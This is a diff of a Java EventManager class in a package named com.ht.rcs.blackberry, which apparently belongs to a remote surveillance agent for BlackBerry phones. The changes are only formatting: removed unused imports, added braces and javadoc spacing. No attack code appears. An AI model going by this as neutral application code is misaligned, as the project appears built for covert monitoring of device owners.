@@ -10,12 +10,10 @@ package com.ht.rcs.blackberry;
 
 import java.util.Vector;
 
-import com.ht.rcs.blackberry.agent.Agent;
 import com.ht.rcs.blackberry.event.Event;
 import com.ht.rcs.blackberry.interfaces.Singleton;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -35,8 +33,9 @@ public class EventManager extends Manager implements Singleton {
      * @return single instance of EventManager
      */
     public synchronized static EventManager getInstance() {
-        if (instance == null)
+        if (instance == null) {
             instance = new EventManager();
+        }
 
         return instance;
     }
@@ -50,6 +49,7 @@ public class EventManager extends Manager implements Singleton {
 
     /*
      * (non-Javadoc)
+     * 
      * @see com.ht.rcs.blackberry.Manager#ReStart(int)
      */
     synchronized public boolean reStart(int Type) {
@@ -59,6 +59,7 @@ public class EventManager extends Manager implements Singleton {
 
     /*
      * (non-Javadoc)
+     * 
      * @see com.ht.rcs.blackberry.Manager#Start(int)
      */
     synchronized public boolean start(int eventId) {
@@ -81,6 +82,7 @@ public class EventManager extends Manager implements Singleton {
 
     /*
      * (non-Javadoc)
+     * 
      * @see com.ht.rcs.blackberry.Manager#StartAll()
      */
     synchronized public boolean startAll() {
@@ -97,6 +99,7 @@ public class EventManager extends Manager implements Singleton {
 
     /*
      * (non-Javadoc)
+     * 
      * @see com.ht.rcs.blackberry.Manager#Stop(int)
      */
     synchronized public int stop(int eventId) {
@@ -124,6 +127,7 @@ public class EventManager extends Manager implements Singleton {
     // a questo agente, quindi possiamo soltanto comandargli lo stop.
     /*
      * (non-Javadoc)
+     * 
      * @see com.ht.rcs.blackberry.Manager#StopAll()
      */
     synchronized public int stopAll() {
